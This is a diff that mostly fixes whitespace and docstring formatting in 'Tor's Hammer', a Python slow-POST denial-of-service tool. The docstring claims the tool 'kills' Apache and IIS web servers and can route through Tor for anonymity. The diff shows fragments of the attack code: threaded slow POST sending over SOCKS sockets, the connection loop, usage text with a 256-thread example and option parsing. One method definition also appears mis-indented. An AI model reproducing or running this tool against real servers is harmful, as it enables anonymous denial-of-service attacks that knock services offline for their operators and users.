@@ -1,6 +1,14 @@
-#!/usr/bin/python                                                                                                   """
+#!/usr/bin/python
+"""
 Tor's Hammer - Slow POST Denial Of Service Testing Tool
-Version 1.0 Beta                                          Project home page: https://sourceforge.net/projects/torsha                                                          Tor's Hammer is a slow post dos testing tool written in PyIt can also be run through the Tor network to be anonymizeIf you are going to run it with Tor it assumes you are runKills most unprotected web servers running Apache and IIS Kills Apache 1.X and older IIS with ~128 threads.
+Version 1.0 Beta
+
+Project home page: https://sourceforge.net/projects/torsha                                
+Tor's Hammer is a slow post dos testing tool written in Python.
+It can also be run through the Tor network to be anonymized.
+If you are going to run it with Tor it assumes you are run tor on 127.0.0.1:9050.
+Kills most unprotected web servers running Apache and IIS via a single instance.
+Kills Apache 1.X and older IIS with ~128 threads.
 Kills newer IIS and Apache 2.X with ~256 threads.
 """
 
@@ -54,7 +62,7 @@ class httpPost(Thread):
         self.socks = socks.socksocket()
         self.tor = tor
         self.running = True
-<------><------>
+        
     def _send_http_post(self, pause=10):
         global stop_now
 
@@ -75,9 +83,9 @@ class httpPost(Thread):
             print term.BOL+term.UP+term.CLEAR_EOL+"Posting: %s" % p+term.NORMAL
             self.socks.send(p)
             time.sleep(random.uniform(0.1, 3))
-<------>
+            
         self.socks.close()
-<------><------>
+                       
 def run(self):
         while self.running:
             while self.running:
@@ -93,7 +101,7 @@ def run(self):
                     print term.BOL+term.UP+term.CLEAR_EOL+"Error connecting to host..."+ term.NORMAL
                     time.sleep(1)
                     continue
-<------>
+                    
             while self.running:
                 try:
                     self._send_http_post()
@@ -104,7 +112,7 @@ def run(self):
                         break
                     time.sleep(0.1)
                     pass
-.
+                   
 def usage():
     print "./torshammer.py -t <target> [-r <threads> -p <port> -T -h]"
     print " -t|--target <Hostname|IP>"
@@ -115,7 +123,7 @@ def usage():
     print "Eg. ./torshammer.py -t 192.168.1.100 -r 256\n"
 
 def main(argv):
-....
+
     try:
         opts, args = getopt.getopt(argv, "hTt:r:p:", ["help", "tor", "target=", "threads=", "port="])
     except getopt.GetoptError:
@@ -123,7 +131,7 @@ def main(argv):
         sys.exit(-1)
 
     global stop_now
-<------>
+    
     target = ''
     threads = 256
     tor = False
